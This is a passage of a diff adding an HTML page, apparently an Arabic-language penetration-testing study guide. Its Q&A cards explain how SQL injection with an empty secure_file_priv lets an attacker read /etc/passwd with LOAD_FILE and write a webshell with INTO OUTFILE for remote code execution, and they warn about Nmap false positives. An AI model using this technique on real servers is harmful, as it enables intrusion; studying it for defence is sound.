+      <div class="convo-a">لأنه يجمع بين قراءة الملفات (LOAD_FILE → /etc/passwd) وكتابتها (INTO OUTFILE → webshell). لو عندك SQL Injection + secure_file_priv فارغ = تكتب webshell مباشرة على الـ web server = RCE كامل!</div>
+    </div>
+    <div class="convo">
+      <div class="convo-q">ليش Nmap ممكن يعطي false positive على MySQL؟</div>
+      <div class="convo-a">بعض الـ NSE scripts تختبر بطريقة غير دقيقة. مثلاً mysql-empty-password ممكن يقول "root بدون باسورد" بس لما تتصل يدوياً يرجع Access denied. دايماً تحقق يدوياً قبل ما تبني خطتك على نتائج Nmap.</div>
+    </div>
+  </div>
+</div>
+
+</div>
+
+<script>
+function showPanel(name,btn){
+  document.querySelectorAll('.tab-panel').forEach(p=>p.classList.remove('active'));
+  document.querySelectorAll('.nav-btn').forEach(b=>b.classList.remove('active'));
+  document.getElementById('panel-'+name).classList.add('active');
+  btn.classList.add('active');
+}
+function showTool(name,btn){
+  document.querySelectorAll('.tool-panel').forEach(p=>p.classList.remove('active'));
+  document.querySelectorAll('.tool-btn').forEach(b=>b.classList.remove('active'));
+  document.getElementById('tool-'+name).classList.add('active');
+  btn.classList.add('active');
+}
+</script>
+</body>
+</html>
